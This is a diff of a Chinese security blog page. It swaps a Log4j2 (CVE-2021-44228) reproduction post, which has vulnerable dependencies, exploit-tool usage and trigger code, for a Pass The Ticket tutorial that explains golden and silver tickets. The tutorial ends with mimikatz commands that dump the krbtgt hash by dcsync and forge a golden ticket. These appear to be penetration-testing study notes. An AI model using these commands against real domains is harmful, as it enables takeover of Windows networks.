@@ -3,7 +3,7 @@
         <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>CVE-2021-44228 Apache Log4j2远程代码执行漏洞 | 老白</title>
+        <title>Pass The Ticket | 老白</title>
         <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -49,75 +49,38 @@
                 <div class="mdui-row">
                         <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                 <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="post-title  mdui-m-b-1">CVE-2021-44228 Apache Log4j2远程代码执行漏洞</div>
-                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-12-16 19:03:15">2021-12-16 / 3 min read</div>
-                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="一-详情描述">一、详情描述</h1>
-<p>  2012年12月19日，<code>Log4j2</code> 中发现了一个 0-day 漏洞，通过记录某个字符串导致远程代码执行（RCE）。<br>
-  考虑到该组件的广泛性，漏洞利用的容易程度。我们简称它为 <code>Log4Shell</code>。<br>
-  0-day 和 <a href="https://github.com/tangxiaofeng7/apache-log4j-poc">github</a>上的 POC 一起在 <a href="https://web.archive.org/web/20211211082351/https://twitter.com/P0rZ9/status/1468949890571337731">twitter</a>发布 。</p>
-<h1 id="二-受影响应用">二、受影响应用</h1>
-<p>  <a href="https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592">受影响组织的响应列表</a><br>
-  已证明<a href="https://twitter.com/chvancooten/status/1469340927923826691">更改iphone名称即可触发Apple服务器中的漏洞</a></p>
-<h1 id="三-漏洞原理">三、漏洞原理</h1>
-<p> 1、Log4j 是一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等。<br>
-<img src="https://V-alkoinen.github.io/post-images/1642835981727.png" alt="" loading="lazy"><br>
- 2、Log4j2 提供了<code>lookups</code>功能，用于向日志中打印 Log4j 配置的值，如：<code>hello ${java:os}</code>、<code>hello ${java:vm}</code>。当然，这也算不上什么，只能说是功能较为强大。<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">lookups说明</a><br>
-<img src="https://V-alkoinen.github.io/post-images/1642836822098.png" alt="" loading="lazy"><br>
- 3、Log4j2还提供了<code>JNDI Lookup、RMI</code>远程调用，可以通过JNDI引入目录资源，进行加载class执行代码。也可以通过RMI远程调用资源。<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">JNDI调用方法</a></p>
-<h1 id="四-漏洞复现">四、漏洞复现</h1>
-<p> 1、新建一个 maven 项目，加入<code>Log4j 2.14.0</code>组件：</p>
-<pre><code>&lt;dependencies&gt;
-    &lt;dependency&gt;
-        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
-        &lt;version&gt;2.14.0&lt;/version&gt;
-    &lt;/dependency&gt;
-    &lt;dependency&gt;
-        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
-        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
-        &lt;version&gt;2.14.0&lt;/version&gt;
-    &lt;/dependency&gt;
-&lt;/dependencies&gt;
+                                    <div class="post-title  mdui-m-b-1">Pass The Ticket</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-12-23 12:27:27">2021-12-23 / 3 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="一-简介">一、简介</h1>
+<p>  票据传递攻击（<code>Pass The Ticket</code>）是基于<code>Kerberos</code>认真的一种攻击方式，黄金票据需要域内<code>Krbtgt</code>用户的NTLM hash 或 AES-256的值，白银票据则需要域内服务账号的NTLM hash或 AES-256的值。<br>
+  <code>krbtgt</code>账户为域内默认创建的账号，是<code>KDC</code>服务使用的账号，属于<code>Domain Admins</code>组，其实域中每个用户的票据都是由<code>krbtgt</code>的密码Hash来计算生成的，因此只要拿到<code>krbtgt</code>的密码Hash，就可以随意伪造票据，进而使用票据登录域控制器。<br>
+  <code>黄金票据</code>：使用krbtgt用户hash生成的票据被称为黄金票据（Golden Ticket），黄金票据的原理是：通过伪造TGT（票据授权票据），没有与KDC（密钥发放中心）进行AS-REQ（认证服务请求）、AS-REP（认证服务响应）通信，直接进行TGS-REQ（票据授权票据请求），向KDC（密钥发放中心）进行请求以获得高权限票据，可以说有了黄金票据就有了域内的最高权限。<br>
+  <code>白银票据</code>：即伪造的TGS（票据授权服务）票据，也称ST（服务票据，也就是在第三次认证中主要用于Client和Server通信上）。通过伪造的TGS（票据授权服务），可以直接发送给Server，访问指定的某个服务，来进行攻击。此过程无需KDC（密钥发放中心），可以绕过域控，很少留下日志。黄金票据使用krbtgt账号的密码散列值，利用伪造高权限的TGT向KDC要求颁发拥有任意服务访问权限的票据，从而获取域控权限。而白银票据会通过相应的服务账号来伪造TGS，例如：LDAP、MSSQL、WinRM、DNS、CIFS等，范围有限，只能获取对应服务的权限。<br>
+  黄金票据需要的条件：域名、SID、Krbtgt NTLM hash、伪造用户名<br>
+  白银票据需要的条件：域名、SID、服务账户NTLM hash、伪造用户名</p>
+<h1 id="二-mimikatz进行ptt">二、mimikatz进行PTT</h1>
+<pre><code>mimikatz
+privilege::debug
+klist purge
+lsadump::dcsync /user:krbtgt
+kerberos::golden /user:krbtgt /domain:laobai.com /sid:S-1-5-21-1103649797-108344867-1523087274 /krbtgt:4a2b7295898847423fef6ae887b684ab /ptt
+net use \\192.168.48.131\ipc$
 </code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1642837513980.png" alt="" loading="lazy"><br>
- 2、使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>开启LDAP及HTTP服务。相关端口可修改 src/main/java/run/ServerStart.java 文件并重新编译。<br>
-<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1642839176072.png" alt="" loading="lazy"><br>
- 3、使用Log4j 打印带有EXP的日志<br>
-因我本机JDK版本为 8u261，因此需要允许通过codebase加载任意远程类</p>
-<pre><code>import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
-
-public class log4jtest {
-
-    public static void main(String[] args){
-
-        Logger logger = LogManager.getLogger(log4jtest.class);
-
-        //String content = &quot;laobai&quot;;
-        //logger.error(&quot;hello ${java:os}&quot;);
-        //logger.error(&quot;hello ${java:vm}&quot;);
-
-        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);
-        logger.error(&quot;&lt;EXP&gt;&quot;);
-        
-    }
-}
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1642839108215.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1642839542272.png" alt="" loading="lazy"></p>
-<h1 id="五-修复方案">五、修复方案</h1>
-<p> 1、升级Apache Log4j2所有相关应用到最新版；<br>
- 2、升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。但仍有绕过Java本身对Jndi远程加载类安全限制的风险。</p>
+<p><img src="https://V-alkoinen.github.io/post-images/1647173649173.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1647173655157.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1647173668028.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1647173677573.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1647173879180.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1647173700900.png" alt="" loading="lazy"></p>
 </div>
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
                                        
-                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/pass-the-hash/">Pass The Hash</a></div></div>
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/mybatis-kuang-jia-sql-injection-jie-jue-fang-an/">MyBatis框架SQL Injection解决方案</a></div></div>
                                         
 
                                         
-                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/">CVE-2021-42287/CVE-2021-42278 一键域控</a></div> </div>
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/pass-the-hash/">Pass The Hash</a></div> </div>
                                        
                                       </div>
                                    
